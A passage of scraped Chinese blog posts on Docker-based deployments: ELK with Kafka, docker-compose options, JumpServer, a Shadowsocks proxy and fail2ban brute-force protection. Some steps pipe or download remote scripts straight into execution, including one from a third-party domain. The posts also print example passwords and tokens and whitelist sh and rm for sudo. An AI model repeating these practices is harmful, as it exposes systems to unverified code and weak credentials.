/etc/localtime:/etc/localtime - logstash:/usr/share/logstash/conf/logstash-kafka.conf environment: - elasticsearch.hosts=http://elasticsearch:9200 - xpack.monitoring.elasticsearch.hosts=http://elasticsearch:9200 networks: - elastic links: - kafka1 - zookeeper depends_on: - elasticsearch zookeeper: restart: always image: zookeeper:3.5.5 restart: always container_name: zookeeper volumes: - /etc/localtime:/etc/localtime - zookeeper:/data - zookeeper1:/datalog networks: - elastic ports: - &quot;2181:2181&quot; kafka1: container_name: kafka1 image: wurstmeister/kafka depends_on: - zookeeper volumes: - /var/run/docker.sock:/var/run/docker.sock - kafka:/kafka - /etc/localtime:/etc/localtime links: - zookeeper ports: - &quot;9092:9092&quot; networks: - elastic environment: - KAFKA_LISTENERS=PLAINTEXT://kafka1:9092 - KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://kafka1:9092 - KAFKA_ZOOKEEPER_CONNECT=zookeeper:2181 - KAFKA_MESSAGE_MAX_BYTES=2000000 - KAFKA_CREATE_TOPICS=all_logs:1:1volumes: elasticsearch: driver: local-persist driver_opts: mountpoint: /elk/elasticsearch/ kibana: driver: local-persist driver_opts: mountpoint: /elk/kibana/ logstash: driver: local-persist driver_opts: mountpoint: /elk/logstash/ zookeeper: driver: local-persist driver_opts: mountpoint: /elk/zookeeper/data/ zookeeper1: driver: local-persist driver_opts: mountpoint: /elk/zookeeper/datalog/ kafka: driver: local-persist driver_opts: mountpoint: /elk/kafka/networks: elastic: driver: bridge 12mkdir -p /root/elkmv docker-compose.yml /root/elk &amp;&amp; cd /root/elk &amp;&amp; docker-compose up -d 开通防火墙对应的端口 123iptables -A INPUT -p tcp -m multiport --dports 9200:9400,5601,9092,9600,2181,10514 -j ACCEPT iptables -A INPUT -p tcp -m multiport --sports 9200:9400,5601,9092,2181,9600,10514 -j ACCEPT iptables-save &gt; /etc/sysconfig/iptables centos 客户端安装filebeat可以 12curl -L -O https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.4.2-linux-x86_64.tar.gztar xzvf filebeat-7.4.2-linux-x86_64.tar.gz 改下filebeat.yml配置文件直接启动就行 修改filebeat.yml文件内容 1234567891011121314151617181920212223filebeat.inputs:- type: log enabled: true paths: - /var/log/nginx/*.logfilebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: falsesetup.template.settings: index.number_of_shards: 1setup.dashboards.enabled: falsesetup.kibana: host: \"http://kibana1:5601\"output.kafka: hosts: [\"kafka1:9092\"] topic: 'all_logs' codec.json: pretty: false 注意 客户端hosts 添加 kafka1 对应server的ip地址 以及filebeat 配置建议使用ansible 12#客户端启动服务./filebeat &amp; 第二步: 修改filebeat配置文件，所有客户机都要操作 vim /etc/filebeat/filebeat.yml filebeat.inputs: type: log enabled: false –注释这一句paths: /var/log/yum.log –这里改成你要测试的日志(也可以写成/var/log/*.log这种，我这里使用yum.log测试比较简单方便） output.elasticsearch: #:144 hosts: [&quot;192.168.224.10:9200&quot;] #指定输出给elasticsearch集群的master:9200 也可以自定义日志 **第三步:**启动服务，两台都要操作./filebeat &amp; 启动 开通防火墙对应的端口 123iptables -A INPUT -p tcp -m multiport --dports 9200:9400,5601,9600,2181,10514 -j ACCEPT iptables -A INPUT -p tcp -m multiport --sports 9200:9400,5601,9600,2181,10514 -j ACCEPT iptables-save &gt; /etc/sysconfig/iptables 回到kibana服务器(192.168.224.10)查看日志，执行以下命令查看获取的索引信息： curl ‘192.168.224.11:9200/_cat/indices?v’ firefox访问http://192.168.224.11:5601 这里可以查看信息","link":"/2020/08/03/docker-compose%E5%AE%89%E8%A3%85elk+kafka/"},{"title":"docker-compose的用法","text":"先来看一份 docker-compose.yml 文件，不用管这是干嘛的，只是有个格式方便后文解说： 12345678910111213141516171819202122232425262728293031323334version: '2'services: web: image: dockercloud/hello-world ports: - 8080 networks: - front-tier - back-tier redis: image: redis links: - web networks: - back-tier lb: image: dockercloud/haproxy ports: - 80:80 links: - web networks: - front-tier - back-tier volumes: - /var/run/docker.sock:/var/run/docker.sock networks: front-tier: driver: bridge back-tier:driver: bridge 可以看到一份标准配置文件应该包含 version、services、networks 三大部分，其中最关键的就是 services 和 networks 两个部分，下面先来看 services 的书写规则。 一：常用参数：1. image1234services: web: image: hello-world 在 services 标签下的第二级标签是 web，这个名字是用户自己自定义，它就是服务名称。image 则是指定服务的镜像名称或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉取这个镜像。例如下面这些格式都是可以的： 123456image: redisimage: ubuntu:14.04image: tutum/influxdbimage: example-registry.com:4000/postgresqlimage: a4bc65fd 2. build2.1 基本用法 服务除了可以基于指定的镜像，还可以基于一份 Dockerfile，在使用 up 启动之时执行构建任务，这个构建标签就是 build，它可以指定 Dockerfile 所在文件夹的路径。Compose 将会利用它自动构建这个镜像，然后使用这个镜像启动服务容器。 12345678910# 指明绝对路径build: /path/to/build/dir# 指明相对路径，只要上下文确定就可以读取到 Dockerfile。build: ./dir# 设定上下文根目录，然后以该目录为准指定 Dockerfile。build: context: ../ dockerfile: path/of/Dockerfile 注意 build 都是一个目录，如果你要指定 Dockerfile 文件需要在 build 标签的子级标签中使用 dockerfile 标签指定，如上面的例子。 如果你同时指定了 image 和 build 两个标签，那么 Compose 会构建镜像并且把镜像命名为 image 后面的那个名字。 12build: ./dirimage: webapp:tag 2.2 构建过程中的args标签 既然可以在 docker-compose.yml 中定义构建任务，那么一定少不了 arg 这个标签，就像 Dockerfile 中的 ARG 指令，它可以在构建过程中指定环境变量，但是在构建成功后取消，在 docker-compose.yml 文件中也支持这样的写法： 12345build: context: . args: buildno: 1 password: secret 下面这种写法也是支持的，一般来说下面的写法更适合阅读。 12345build: context: . args: - buildno=1 - password=secret 与 ENV 不同的是，ARG 是允许空值的。例如： 123args: - buildno - password 这样构建过程可以向它们赋值。 注意：YAML 的布尔值（true, false, yes, no, on, off）必须要使用引号引起来（单引号、双引号均可），否则会当成字符串解析。 3. command使用 command 可以覆盖容器启动后默认执行的命令。 1command: bundle exec thin -p 3000 也可以写成类似 Dockerfile 中的格式： 1command: [bundle, exec, thin, -p, 3000] 4. container_name前面说过 Compose 的容器名称格式是：&lt;项目名称&gt;&lt;服务名称&gt;&lt;序号&gt;虽然可以自定义项目名称、服务名称，但是如果你想完全控制容器的命名，可以使用这个标签指定： 1container_name: app 这样容器的名字就指定为 app 了。 5. depends_on在使用 Compose 时，最大的好处就是少打启动命令，但是一般项目容器启动的顺序是有要求的，如果直接从上到下启动容器，必然会因为容器依赖问题而启动失败。例如在没启动数据库容器的时候启动了应用容器，这时候应用容器会因为找不到数据库而退出，为了避免这种情况我们需要加入一个标签，就是 depends_on，这个标签解决了容器的依赖、启动先后的问题。例如下面容器会先启动 redis 和 db 两个服务，最后才启动 web 服务： 1234567891011121314151617181920version: '3'services: web: image: nginx container_name: nginx depends_on: - db - redis fpm: build: context: . dockerfile: Dockerfile image: php container_name: php redis: image: redis container_name: redis db: image: mysql container_name: mysql 注意的是，默认情况下使用 docker-compose up web 这样的方式启动 web 服务时，也会启动 redis 和 db 两个服务，因为在配置文件中定义了依赖关系。 6. ports映射端口的标签。使用主机端口：容器端口格式 或者 只是指定容器的端口，宿主机会随机映射端口。 12345ports: - &quot;3000&quot; - &quot;8000:8000&quot; - &quot;49100:22&quot; - &quot;127.0.0.1:8001:8001&quot; 下面这是示列 1234567891011121314151617181920212223 version: '3'services: web: image: nginx container_name: nginx depends_on: - db - redis ports: - &quot;88:80&quot; fpm: build: context: . dockerfile: Dockerfile image: php container_name: php ports: - &quot;9000:9000&quot; redis: image: redis container_name: redis ports: - &quot;6379:637 注意：当使用主机端口：宿主机端口格式来映射端口时，如果你使用的容器端口小于60你可能会得到错误得结果，因为YAML将会解析xx:yy这种数字格式为60进制，所以建议使用字符串格式 7. links还记得上面的depends_on吧，那个标签解决的是启动顺序问题，这个标签解决的是容器连接问题，与Docker client的–link一样效果，会连接到其它服务中的容器。格式如下： 1234links: - db - db:database - redis 使用的别名将会自动在服务容器中的/etc/hosts里创建。例如： 123172.12.2.186 db172.12.2.186 database172.12.2.187 redis 相应的环境变量也将被创建。 8. volumes挂载一个目录或者一个已存在的数据卷容器，可以直接使用 [HOST:CONTAINER] 这样的格式，或者使用 [HOST:CONTAINER:ro] 这样的格式，后者对于容器来说，数据卷是只读的，这样可以有效保护宿主机的文件系统。Compose的数据卷指定路径可以是相对路径，使用 . 或者 .. 来指定相对目录。数据卷的格式可以是下面多种形式： 123456789101112131415volumes: # 只是指定一个路径，Docker 会自动在创建一个数据卷（这个路径是容器内部的）。 - /var/lib/mysql # 使用绝对路径挂载数据卷 - /opt/data:/var/lib/mysql # 以 Compose 配置文件为中心的相对路径作为数据卷挂载到容器。 - ./cache:/tmp/cache # 使用用户的相对路径（~/ 表示的目录是 /home/&lt;用户目录&gt;/ 或者 /root/）。 - ~/configs:/etc/configs/:ro # 已经存在的命名的数据卷。 - datavolume:/var/lib/mysql 如果你不使用宿主机的路径，你可以指定一个volume_driver。 比如 –&gt; volume_driver: mydriver 9. environment与上面的 env_file 标签完全不同，反而和 arg 有几分类似，这个标签的作用是设置镜像变量，它可以保存变量到镜像里面，也就是说启动的容器也会包含这些变量设置，这是与 arg 最大的不同。一般 arg 标签的变量仅用在构建过程中。而 environment 和 Dockerfile 中的 ENV 指令一样会把变量一直保存在镜像、容器中，类似 docker run -e 的效果，两种写法。 123456789environment: RACK_ENV: development SHOW: 'true' SESSION_SECRET:environment: - RACK_ENV=development - SHOW=true - SESSION_SECRET 12 10. external_links在使用Docker过程中，我们会有许多单独使用docker run启动的容器，为了使Compose能够连接这些不在docker-compose.yml中定义的容器，我们需要一个特殊的标签，就是external_links，它可以让Compose项目里面的容器连接到那些项目配置外部的容器（前提是外部容器中必须至少有一个容器是连接到与项目内的服务的同一个网络里面）。格式如下： 1234external_links: - redis_1 - project_db_1:mysql - project_db_1:postgresql 非常用参数1.dns和 –dns 参数一样用途，格式如下： 1dns: 8.8.8.8 也可以是一个列表： 123dns: - 8.8.8.8 - 9.9.9.9 此外 dns_search 的配置也类似： 1234dns_search: example.comdns_search: - dc1.example.com - dc2.example.com 2. tmpfs挂载临时目录到容器内部，与 run 的参数一样效果： 1234tmpfs: /runtmpfs: - /run - /tmp 3. entrypoint在 Dockerfile 中有一个指令叫做 ENTRYPOINT 指令，用于指定接入点，第四章有对比过与 CMD 的区别。在 docker-compose.yml 中可以定义接入点，覆盖 Dockerfile 中的定义： 1entrypoint: /code/entrypoint.sh 格式和 Docker 类似，不过还可以写成这样： 1234567entrypoint: - php - -d - zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so - -d - memory_limit=-1 - vendor/bin/phpunit 4.env_file还记得前面提到的 .env 文件吧，这个文件可以设置 Compose 的变量。而在 docker-compose.yml 中可以定义一个专门存放变量的文件。如果通过 docker-compose -f FILE 指定了配置文件，则 env_file 中路径会使用配置文件路径。 如果有变量名称与 environment 指令冲突，则以后者为准。格式如下： 1env_file: .env 或者根据 docker-compose.yml 设置多个： 1234env_file: - ./common.env - ./apps/web.env - /opt/secrets.env 注意的是这里所说的环境变量是对宿主机的 Compose 而言的，如果在配置文件中有 build 操作，这些变量并不会进入构建过程中，如果要在构建中使用变量还是首选前面刚讲的 arg 标签。 12 5. expose这个标签与Dockerfile中的EXPOSE指令一样，用于指定暴露的端口，但是只是作为一种参考，实际上docker-compose.yml的端口映射还得ports这样的标签。 123expose: - &quot;3000&quot; - &quot;8000&quot; 6. extra_hosts添加主机名的标签，就是往/etc/hosts文件中添加一些记录，与Docker client的–add-host类似： 12345678910111213141516171819202122232425extra_hosts: - &quot;somehost:162.242.195.82&quot; - &quot;otherhost:50.31.209.229&quot;version: '3'services: web: image: nginx container_name: nginx depends_on: - db - redis ports: - &quot;88:80&quot; links: - db - db:mysql - redis:redis - fpm:php dns: - 8.8.8.8 - 223.5.5.5 extra_hosts: - &quot;somehosts:162.242.195.82&quot; - &quot;myhost:122.152.250.233&quot; 启动之后查看容器内部hosts： 123162.242.195.82 somehost50.31.209.229 otherhost162.242.195.82 somehost50.31.209.229 otherhost 7. labels向容器添加元数据，和Dockerfile的LABEL指令一个意思，格式如下： 12345678labels: com.example.description: \"Accounting webapp\" com.example.department: \"Finance\" com.example.label-with-empty-value: \"\"labels: - \"com.example.description=Accounting webapp\" - \"com.example.department=Finance\" - \"com.example.label-with-empty-value\" 8. logging这个标签用于配置日志服务。格式如下： 1234logging: driver: syslog options: syslog-address: &quot;tcp://192.168.0.42:123&quot; 默认的driver是json-file。只有json-file和journald可以通过docker-compose logs显示日志，其他方式有其他日志查看方式，但目前Compose不支持。对于可选值可以使用options指定。有关更多这方面的信息可以阅读官方文档：https://docs.docker.com/engine/admin/logging/overview/ 9. pid1pid: &quot;host&quot; 将PID模式设置为主机PID模式，跟主机系统共享进程命名空间。容器使用这个标签将能够访问和操纵其他容器和宿主机的名称空间。 10. security_opt为每个容器覆盖默认的标签。简单说来就是管理全部服务的标签。比如设置全部服务的user标签值为USER。 123security_opt: - label:user:USER - label:role:ROLE 11. stop_signal设置另一个信号来停止容器。在默认情况下使用的是SIGTERM停止容器。设置另一个信号可以使用stop_signal标签。 1stop_signal: SIGUSR1 12. volumes_from从其它容器或者服务挂载数据卷，可选的参数是 :ro或者 :rw，前者表示容器只读，后者表示容器对数据卷是可读可写的。默认情况下是可读可写的。 12345volumes_from: - service_name - service_name:ro - container:container_name - container:container_name:rw 13. cap_add, cap_drop添加或删除容器的内核功能。详细信息在前面容器章节有讲解，此处不再赘述。 123456cap_add: - ALL cap_drop: - NET_ADMIN - SYS_ADMIN 14. cgroup_parent指定一个容器的父级cgroup。 1cgroup_parent: m-executor-abcd 15. devices设备映射列表。与Docker client的–device参数类似。 12devices: - &quot;/dev/ttyUSB0:/dev/ttyUSB0&quot; 16. extends这个标签可以扩展另一个服务，扩展内容可以是来自在当前文件，也可以是来自其他文件，相同服务的情况下，后来者会有选择地覆盖原有配置。 123extends: file: common.yml service: webapp 用户可以在任何地方使用这个标签，只要标签内容包含file和service两个值就可以了。file的值可以是相对或者绝对路径，如果不指定file的值，那么Compose会读取当前YML文件的信息。更多的操作细节在后面的12.3.4小节有介绍。 17. network_mode网络模式，与Docker client的–net参数类似，只是相对多了一个service:[service name] 的格式。例如： 123456network_mode: &quot;bridge&quot;network_mode: &quot;host&quot;network_mode: &quot;none&quot;network_mode: &quot;service:[service name]&quot;network_mode: &quot;container:[container name/id]&quot; 可以指定使用服务或者容器的网络。 18. networks加入指定网络，格式如下： 123456services: some-service: networks: - some-network - other-network 关于这个标签还有一个特别的子标签aliases，这是一个用来设置服务别名的标签，例如： 1234567891011services: some-service: networks: some-network: aliases: - alias1 - alias3 other-network: aliases: - alias2 相同的服务可以在不同的网络有不同的别名。 19. 其它还有这些标签：cpu_shares, cpu_quota, cpuset, domainname, hostname, ipc, mac_address, mem_limit, memswap_limit, privileged, read_only, restart, shm_size, stdin_open, tty, user, working_dir上面这些都是一个单值的标签，类似于使用docker run的效果。 12作者：左蓝链接：https://www.jianshu.com/p/2217cfed29d7來源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 转载于:https://www.cnblogs.com/regit/p/8309959.html","link":"/2020/08/04/docker-compose%E7%94%A8%E6%B3%95/"},{"title":"docker数据持久卷插件","text":"docker数据持久卷插件 作者地址 https://github.com/MatchbookLab/local-persist 1、从“ 发行”页面下载适合您的操作系统和体系结构的二进制文件。2、重命名下载的文件 docker-volume-local-persist3、将其放入/usr/bin（您可以将其放置在其他位置，但是请确保您的Systemd（或类似名称）配置反映了所做的更改）。4、确保文件是可执行文件（chmod +x /usr/bin/docker-volume-local-persist）5、只需在此处运行它（键入docker-volume-local-persist并按Enter键）进行测试就足够了，等等，如果这就是您要尝试的全部，那么您就完成了。但是，如果您希望它从Docker开始，请继续执行步骤6。6、下载systemd.service7、将服务文件重命名为 docker-volume-local-persist.service8、移到 /etc/systemd/system/9、运行sudo systemctl daemon-reload以重新加载配置10、运行sudo systemctl enable docker-volume-local-persist以启用服务（它将在Docker之后启动）11、立即运行sudo systemctl start docker-volume-local-persist以启动它。如果已经启动，可以安全运行 插件下载地址 https://github.com/MatchbookLab/local-persist/releases/download/v1.3.0/local-persist-linux-amd64 重命名下载的文件 docker-volume-local-persist 123wget https://github.com/MatchbookLab/local-persist/releases/download/v1.3.0/local-persist-linux-amd64chmod +x local-persist-linux-amd64 &amp;&amp; mv local-persist-linux-amd64 docker-volume-local-persist &amp;&amp; mv docker-volume-local-persist /usr/bin/ 编辑服务文件vim /etc/systemd/system/docker-volume-local-persist.service 12345678910111213# docker-volume-local-persist.service 文件内容为[Unit]Description=docker-volume-local-persistBefore=docker.serviceWants=docker.service[Service]TimeoutStartSec=0ExecStart=/usr/bin/docker-volume-local-persist[Install]WantedBy=multi-user.target 启动服务，并开机自启 1systemctl daemon-reload &amp;&amp; systemctl enable docker-volume-local-persist &amp;&amp; systemctl start docker-volume-local-persist 用法：创建卷然后，可以使用此插件创建一个卷（此示例将用于图像的共享文件夹）：手动创建卷docker volume create -d local-persist -o mountpoint=/data/images –name=images 参数说明： mountpoint=/data/images 代表卷的目录。 注意，只有使用了插件才可以使用mountpoint–name=images 代表卷的名字 写docker-compose示例 123456789volumes: data01: driver: local-persist driver_opts: mountpoint: /data/a data10: driver: local-persist driver_opts: mountpoint: /data/b data01 代表卷的名字， /data/a/表示卷的物理路径。","link":"/2020/08/04/docker%E6%95%B0%E6%8D%AE%E5%8C%96%E6%8C%81%E4%B9%85%E5%8D%B7%E6%8F%92%E4%BB%B6/"},{"title":"docker-compose一键部署jumpserver","text":"用docker-compose 安装jumpserver 安装docker1234567yum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-ce docker-ce-cli containerd.iosystemctl start docker &amp;&amp; systemctl enable docker docker疑难杂症：docker命令Tab无法自动补全 1234567一、安装bash-completeyum install -y bash-completion二、刷新文件source /usr/share/bash-completion/completions/dockersource /usr/share/bash-completion/bash_completion 安装docker-compose12345678910 curl -L https://github.com/docker/compose/releases/download/1.26.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose 或者：curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose查看版本信息# docker-compose --version 需要注意安装iptables 而且如果iptables相关报错的话 重启下 123注意/etc/sysctl.conf 里面写 net.ipv4.ip_forward = 1运行命令 sysctl -p --system 开始安装jumpserver dockerfile 文件123456mkdir jumpserver cd jumpservergit clone https://github.com/wojiushixiaobai/docker-compose.gitcd docker-composecat .envdocker-compose up -d 以下文件内容为.env 1234567891011# 版本号可以自己根据项目的版本修改Version=1.5.4# MYSQL_ROOT_PASSWORD 不支持纯数字, 字符串位数推荐大于等于 8MYSQL_ROOT_PASSWORD=oM0aevSQaH8Bd2Bgg5cX8lOd# SECRET_KEY 不支持纯数字, 推荐字符串位数大于等于 50, 仅首次安装定义, 升级或者迁移请勿修改此项SECRET_KEY=B3f2w8P2PfxIAS7s4URrD9YmSbtqX4vXdPUL217kL9XPUOWrmy# BOOTSTRAP_TOKEN 不支持纯数字, 推荐字符串位数大于等于 16, 仅首次安装定义, 升级或者迁移请勿修改BOOTSTRAP_TOKEN=7Q11Vz6R2J6BLAdO 以下文件内容为docker-compose.yml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120version: '3'services: mysql: image: mysql:5.7 container_name: jms_mysql restart: always tty: true environment: MYSQL_ROOT_PASSWORD: $MYSQL_ROOT_PASSWORD MYSQL_DATABASE: jumpserver command: --character-set-server=utf8 volumes: - db-data:/var/lib/mysql networks: - jumpserver redis: image: redis:alpine container_name: jms_redis restart: always tty: true volumes: - redis-data:/data networks: - jumpserver core: image: wojiushixiaobai/jms_core:${Version} container_name: jms_core hostname: jms_core restart: always tty: true environment: SECRET_KEY: $SECRET_KEY BOOTSTRAP_TOKEN: $BOOTSTRAP_TOKEN DB_ENGINE: mysql DB_HOST: mysql DB_PORT: 3306 DB_USER: root DB_PASSWORD: $MYSQL_ROOT_PASSWORD DB_NAME: jumpserver REDIS_HOST: redis depends_on: - mysql - redis volumes: - static:/opt/jumpserver/data/static - media:/opt/jumpserver/data/media - logs:/opt/jumpserver/logs networks: - jumpserver koko: image: wojiushixiaobai/jms_koko:${Version} container_name: jms_koko restart: always tty: true environment: CORE_HOST: http://core:8080 BOOTSTRAP_TOKEN: $BOOTSTRAP_TOKEN depends_on: - core - mysql - redis volumes: - keys-data:/opt/koko/data/keys ports: - 2222:2222 networks: - jumpserver guacamole: image: wojiushixiaobai/jms_guacamole:${Version} container_name: jms_guacamole restart: always tty: true environment: JUMPSERVER_SERVER: http://core:8080 BOOTSTRAP_TOKEN: $BOOTSTRAP_TOKEN JUMPSERVER_KEY_DIR: /config/guacamole/keys GUACAMOLE_HOME: /config/guacamole GUACAMOLE_LOG_LEVEL: ERROR depends_on: - core - mysql - redis volumes: - gua-key:/config/guacamole/keys networks: - jumpserver nginx: image: wojiushixiaobai/jms_nginx:${Version} container_name: jms_nginx restart: always tty: true depends_on: - core - koko - mysql - redis volumes: - static:/opt/jumpserver/data/static - media:/opt/jumpserver/data/media ports: - 80:80 networks: - jumpservervolumes: static: media: logs: db-data: redis-data: keys-data: gua-key:networks: jumpserver: jms_koko的端口也可以改 也可以改变下jumpserver的访问端口 12vim ./docker-compose/docker-compose.yml把里面的nginx 容器映射端口80:80 改成88:80 然后输入ip地址对应的88端口就可以登录了，默认密码是admin jumpserver的使用登录后先创建相关用户，设置 首先创建 用户管理 ——&gt;用户列表—–创建用户 用户管理 ——&gt;用户组—–创建用户组 现在luke用户就属于运维组了 **资产管理 ** —-&gt; 资产列表 —-&gt;创建资产 **资产管理 ** —-&gt; 管理用户 和系统用户 1,创建管理用户root的时候密码需要写服务器的登录密码，系统用户也要自己新设密码 2,创建管理用户最好是设置秘钥的方式连接 先在服务器设置秘钥 -C 是生成新的备注luke.com 123ssh-keygen -C &quot;luke.com&quot; 直接敲回车生成秘钥对， cd ~/.ssh 把自己的公钥复制到authorized_keys中cp id_rsa.pub authorized_keys然后把id_rsa私钥 下载到本地保存 然后在管理用户里面上传服务器的秘钥 然后提交就可以了， 需要连接其他服务器的话就直接把第一台服务器的公钥放到~/.ssh/authorized_keys 文件去，然后就可以了 还需要设置命令过滤 创建系统用户的时候重要的命名需要添加sudo 权限才能执行 设置密码123.yunwei 例如下面的命令 12/bin/whoami,/usr/bin/docker,/usr/sbin/nginx,/usr/bin/ansible-playbook,/usr/bin/openresty,/usr/bin/vim,/usr/bin/ansible,/usr/bin/cd,/usr/bin/unzip,/usr/bin/cp,/usr/bin/mkdir,/usr/bin/chown,/usr/bin/ssh,/usr/sbin/iptables,/usr/bin/echo,/usr/bin/systemctl,/usr/bin/sh,/usr/bin/sed,/usr/bin/cat,/usr/bin/grep,/usr/bin/mv,/usr/bin/chmod,/usr/local/bin/docker-compose,/usr/sbin/service,/usr/bin/tail,/usr/bin/rm 下一步创建 权限管理 —&gt;资产授权—&gt;创建授权 创建相关资产，然后退出administrator用户， 重新用luke用户登录，并设置ssh 点击资产管理—-&gt;系统用户—-&gt;点击yunwei 然后测试资产连接性 点击会话管理 然后点击web终端 就可以了，进入是以系统用户的身份登录的服务器 在里面编辑一些文件都需要加sudo 权限 报这样的错误，就需要把权限加进去 加入给系统用户加上权限后就可以编辑文件了 用Xshell连接jms_koko 2020端口然后进行操作先把自己用户的秘钥下载到本地，然后导入xshell里面 然后进行连接， 也可以用 用户的登录密码进行连接 然后就可以通过终端的方式连接","link":"/2020/08/05/docker%E6%90%AD%E5%BB%BAjumpserver/"},{"title":"docker安装配置ss最新","text":"使用docker安装配置 SS1. Install Dockercurl -fsSl https://get.docker.com | sh 2. Create configuration file 12345678910111213mkdir -p /etc/shadowsocks-rustcat &gt; /etc/shadowsocks-rust/config.json &lt;&lt;EOF{ \"server\":\"0.0.0.0\", \"server_port\":9000, \"password\":\"123.shui\", \"timeout\":300, \"method\":\"aes-256-gcm\", \"nameserver\":\"8.8.8.8\", \"mode\":\"tcp_and_udp\"}EOF 3. Run container1docker run -d -p 9000:9000 -p 9000:9000/udp --name ss-rust --restart=always -v /etc/shadowsocks-rust:/etc/shadowsocks-rust teddysun/shadowsocks-rust 4. Generate SS URLdocker exec -it ss-rust ssurl --encode /etc/shadowsocks-rust/config.json ss://YWVzLTI1Ni1nY206MTIzLnNodWk@0.0.0.0:9000 replace 0.0.0.0 with server public IP, for example ss://YWVzLTI1Ni1nY206MTIzLnNodWk@23.112.227.162:9000 5. Enable BBR(optional)1wget -N --no-check-certificate \"https://github.000060000.xyz/tcpx.sh\" &amp;&amp; chmod +x tcpx.sh &amp;&amp; ./tcpx.sh Choose 1 to install official BBR kernel. After reboot, choose 22 to optimize and enable bbr&amp;fq.","link":"/2022/04/17/docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEss%E6%9C%80%E6%96%B0/"},{"title":"fail2ban","text":"如何防止别人暴力破解你的密码！Fail2ban阻止暴力破解简介：Fail2ban能够监控系统日志，匹配日志中的错误信息（使用正则表达式），执行相应的屏蔽动作（支持多种，一般为调用 iptables ），是一款很实用、强大的软件。如：攻击者不断尝试穷举SSH、SMTP 、FTP 密码等，只要达到预设值，fail2ban 就会调用防火墙屏蔽此 IP ，并且可以发送邮件通知系统管理员。功能、特性：1、支持大量服务：sshd 、apache 、qmail 等2、支持多作动作：iptables 、tcp-wrapper 、shorewall 、mail notifications 等3、logpath 选项中支持通配符4、需要 Gamin 支持（Gamin 用于监控文件和目录是否更改）5、如果需要邮件通知，则系统事先要确保能够正常发送邮件 1、fail2ban 安装 yum install -y epel-release yum install -y fail2ban 2、fail2ban 结构/etc/fail2ban fail2ban服务配置目录/etc/fail2ban/action.d ** **iptables、mail 等动作文件目录/etc/fail2ban/filter.d **条件匹配文件目录，过滤日志关键内容/etc/fail2ban/jail.conf ****fail2ban防护配置文件/etc/fail2ban/fail2ban.conf ** **fail2ban配置文件，定义日志级别、日志、sock 文件位置等 ** 3、fail2ban.conf 配置shell &gt; grep -v ^# /etc/fail2ban/fail2ban.conf[Definition]loglevel = 3 ##定义日志级别，默认logtarget = /var/log/fail2ban.log ##定义 fail2ban 日志文件socket = /var/run/fail2ban/fail2ban.sock ## sock文件存放位置，默认pidfile = /var/run/fail2ban/fail2ban.pid ## pid文件存放位置，默认 4、jail.conf 防护配置配置fail2ban并实现防暴力破解 1.官方的文档写到：在配置时，我们应该避免修改由fail2ban安装创建的文件，我们应该去编写具有.local扩展名的新文件。在.local新文件里配置的内容会覆盖jail.conf内容里相同的值。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455 vim /etc/fail2ban/jail.d/jail.local 文件内容：#defalut这里是设定全局设置，如果下面的监控没有设置就以全局设置的值设置。[DEFAULT]# 用于指定哪些地址ip可以忽略 fail2ban 防御,以空格间隔。ignoreip = 127.0.0.1/8 40.244.62.17# 客户端主机被禁止的时长（默认单位为秒）bantime = 3600# 过滤的时长（秒）findtime = 600# 匹配到的阈值（次数）maxretry = 3[ssh-iptables]# 是否开启enabled = true# 过滤规则filter = sshd# 以空格分隔的列表，可以是 IP 地址、CIDR 前缀或者 DNS 主机名# 用于指定哪些地址可以忽略 fail2ban 防御ignoreip = 127.0.0.1 # 客户端主机被禁止的时长（秒）,永久封禁 -1bantime = 86400# ssh 服务的最大尝试次数maxretry = 3# 查找失败次数的时长（秒）findtime = 600backend = auto# 动作action = iptables[name=SSH, port=ssh, protocol=tcp]mail[name=SSH,dest=cleartly.org@etlgr.com,sender=fail2ban@email.com] #这行不配置也行，这样就不发送邮件了# Red Hat 系的发行版# 日志文件的路径logpath = /var/log/secure# nginx防护[nginx-get-dos]enabled = true#port = http,https#filter.d/nginx-get-dos.conf 文件名filter = nginx-get-dosignoreip = 127.0.0.1 40.244.62.17#需要监控nginx日志loglogpath = /var/log/nginx/access.logmaxretry = 1500findtime = 60bantime = 1200action = iptables-multiport[name=nginx,port=\\&quot;http,https,666,888,2018,2019,2020\\&quot;,protocol=tcp] mail[name=nginx,dest=cleartly.org@etlgr.com] 编辑nginx防护规则文件 vim /etc/fail2ban/filter.d/nginx-get-dos.conf 123[Definition]failregex = &lt;HOST&gt; -.*- .*HTTP/1.* .* .*$ignoreregex = 在这里需要注意一点就是：我们上面的action设置的时候，port=ssh，如果我们更改了sshd服务的端口号，我能需要在这里设置对应的端口号，否则配置不生效。 防暴力破解测试 在上面配置好了之后，我们需要让配置生效： 1fail2ban-client reload 测试：故意输入错误密码3次，再进行登录时，会拒绝登录 我们可以查看当前被禁止登陆的ip： 1234567891011[root@server1 jail.d]# fail2ban-client status ssh-iptablesStatus for the jail: ssh-iptables|- Filter| |- Currently failed: 1 #当前失败次数| |- Total failed: 4 #当前失败次数| `- File list: /var/log/secure`- Actions #日志文件路径 |- Currently banned: 1 #当前禁止的ip数量 |- Total banned: 1 `- Banned IP list: 192.168.224.11 #当前禁止的ip- Total banned: 1 #禁止的ip总数 fail2ban常用的命令3.1 启动暂停查看状态 service fail2ban start/restart/stop/status fail2ban 3.2 fail2ban-clientstart 启动fail2ban server和监狱reload 重新加载配置文件stop 暂停fail2ban和监狱status 查看运行的监控服务数量和列表set loglevel 设置日志等级，有 CRITICAL, ERROR, WARNING,NOTICE, INFO, DEBUGget loglevel 获取当前日志的等级set idle on|off 设置某个监控（监狱）的状态。set addignoreip 设置某个监控（监狱）可以忽略的ipset delignoreip 